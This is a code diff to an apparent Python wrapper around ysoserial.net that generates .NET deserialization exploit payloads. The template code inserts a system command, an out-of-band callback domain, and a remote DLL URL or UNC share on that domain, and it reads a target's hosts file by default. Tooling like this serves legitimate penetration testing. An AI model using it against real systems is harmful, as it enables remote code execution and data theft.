@@ -229,6 +229,7 @@ class YSOSerialNet(Serializer):
         system_command = self.chainOpts.system_command
         interact_domain = self.chainOpts.interact_domain
         remote_file_to_read = "C:\\WINDOWS\\System32\\drivers\\etc\\hosts" if self.chainOpts.remote_file_to_read is None else self.chainOpts.remote_file_to_read
+        remote_file_to_read = remote_file_to_read.replace('\\','/')
         remote_file_to_write = self.chainOpts.remote_file_to_write
         csharp_code = self.getFileContentOrCode(self.chainOpts.csharp_code)
         csharp_code_dlls = self.chainOpts.csharp_code_dlls
@@ -304,9 +305,11 @@ class YSOSerialNet(Serializer):
                         continue
 
                     logging.info(f"[{chain['name']}] Generating payload with formatter '{formatter}'")
+                    
+                    chainIdFormatter = f"{chain['id']}-{formatter.lower().replace('.','')}"
 
                     chain_system_command = system_command
-                    chain_system_command = chain_system_command.replace('%%chain_id%%', chain['id'])
+                    chain_system_command = chain_system_command.replace('%%chain_id%%', chainIdFormatter)
                     chain_system_command = chain_system_command.replace('%%domain%%', str(self.chainOpts.interact_domain))
                     escaped_chain_system_command = chain_system_command.replace('"', '\\"')
                     chain_system_command = chain_system_command.replace("'", "\\'")
@@ -321,9 +324,9 @@ class YSOSerialNet(Serializer):
                     chainArguments = chainArguments.replace('<gadget>', gadget)
                     chainArguments = chainArguments.replace('<local_file>', os.path.basename(fp.name)+";"+csharp_code_dlls)
                     chainArguments = chainArguments.replace('<system_command>', chain_system_command)
-                    chainArguments = chainArguments.replace('<domain>', f"{chain['id']}.{interact_domain}")
-                    chainArguments = chainArguments.replace('<url>', f"https://{chain['id']}.{interact_domain}/{chain['id']}.dll")
-                    chainArguments = chainArguments.replace('<unc>', f"\\\\{chain['id']}.{interact_domain}\\share\\{chain['id']}.dll".replace('\\', '\\\\'))
+                    chainArguments = chainArguments.replace('<domain>', f"{chainIdFormatter}.{interact_domain}")
+                    chainArguments = chainArguments.replace('<url>', f"https://{chainIdFormatter}.{interact_domain}/{chain['id']}.dll")
+                    chainArguments = chainArguments.replace('<unc>', f"\\\\{chainIdFormatter}.{interact_domain}\\share\\{chain['id']}.dll".replace('\\', '\\\\'))
                     chainArguments = chainArguments.replace('<net_remoting_url>', csharp_net_remoting.replace('%%chain_id%%', chain['id']))
                     chainArguments = chainArguments.replace('<remote_file_to_read>', remote_file_to_read)
                     chainArguments = chainArguments.replace('<remote_file_to_write>', remote_file_to_write.replace('%%ext%%', 'dll'))
@@ -359,13 +362,16 @@ class YSOSerialNet(Serializer):
                                 ft.write(payload)
                                 binPayloadGenerated = True
                     else:
+                        # json formatters can have single quotes instead of double quotes, which can be a problem for some usages, so we escape them
+                        if outputFormat == 'json' and re.search(r'\{\s*\'', payload.decode('ascii')):
+                            payload = payload.decode('ascii').replace('"', '\\"').replace("'", '"').encode('ascii')
                         # clean string style formatters to have 1 payload per line
                         if not self.chainOpts.one_file_per_payload:
-                            payload = payload.decode('ascii').replace('\r', '').replace('\n', '').encode('ascii')
+                            payload = payload.decode('ascii').replace('\t', '').replace('\r', '').replace('\n', '').encode('ascii')
 
                     payload = self.encode(payload)
                     
-                    self.output(f"{chain['id']}_{formatter}", payload+b"\n")
+                    self.output(chainIdFormatter, payload+b"\n")
                     count = count + 1
         
         # cleanup temp file
